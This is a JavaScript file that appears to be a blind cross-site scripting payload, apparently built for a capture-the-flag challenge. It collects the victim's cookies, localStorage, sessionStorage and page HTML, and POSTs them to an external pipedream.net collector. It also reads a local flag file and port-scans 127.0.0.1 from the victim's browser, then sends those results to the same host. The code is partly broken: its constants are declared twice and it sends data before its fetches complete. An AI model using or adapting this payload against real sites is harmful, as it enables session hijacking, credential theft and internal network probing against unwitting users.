// Function to get all data from localStorage
function getLocalStorageData() {
  let localStorageData = {};
  for (let i = 0; i < localStorage.length; i++) {
    let key = localStorage.key(i);
    localStorageData[key] = localStorage.getItem(key);
  }
  return localStorageData;
}

// Function to get all data from sessionStorage
function getSessionStorageData() {
  let sessionStorageData = {};
  for (let i = 0; i < sessionStorage.length; i++) {
    let key = sessionStorage.key(i);
    sessionStorageData[key] = sessionStorage.getItem(key);
  }
  return sessionStorageData;
}

// Create headers
const headers = new Headers();
headers.append("Content-Type", "application/json");

// Create body object with localStorage and sessionStorage data
const body = {
  "test": "Blind",
  "Domain": document.domain,
  "cookie": document.cookie,
  "Location": document.location.href, // Changed to document.location.href for string value
  "localStorage": getLocalStorageData(),
  "sessionStorage": getSessionStorageData(),
  "body": document.body.innerHTML, // Changed to document.body.innerHTML for string value
};

// Create options for fetch
const options = {
  method: "POST",
  headers,
  mode: "cors",
  body: JSON.stringify(body),
};

// Send request
fetch("https://eouk09tgoyr96dk.m.pipedream.net", options)

let flag = ""
fetch('http://127.0.0.1/flag.txt')
  .then(response => {
    if (response.ok) {
      return response.text();
    } else {
      throw new Error('Error:', response.status);
    }
  })
  .then(data => {
    console.log(data);
    flag = data;
  })
  .catch(error => {
    console.error('Error:', error);
    flag = error.message;
  });

const portScanResults = [];

for (let port = 1; port <= 1000; port++) {
  const url = `http://127.0.0.1:${port}`;

  fetch(url)
    .then(response => {
      if (response.ok) {
        return response.text();
      } else {
        return null;
      }
    })
    .then(data => {
      if (data) {
        portScanResults.push({ port, status: 'open', content: data });
      } else {
        portScanResults.push({ port, status: 'closed' });
      }
    })
    .catch(error => {
      portScanResults.push({ port, status: 'closed' });
    });
}

const body = {
  "test": "Blind",
  "Domain": document.domain,
  "cookie": document.cookie,
  "Location": document.location,
  "body": document.body,
  "flag": flag,
  "portScanResults": portScanResults
}

const options = {
  method: "POST",
  headers,
  mode: "cors",
  body: JSON.stringify(body),
}

fetch("https://eouk09tgoyr96dk.m.pipedream.net", options)
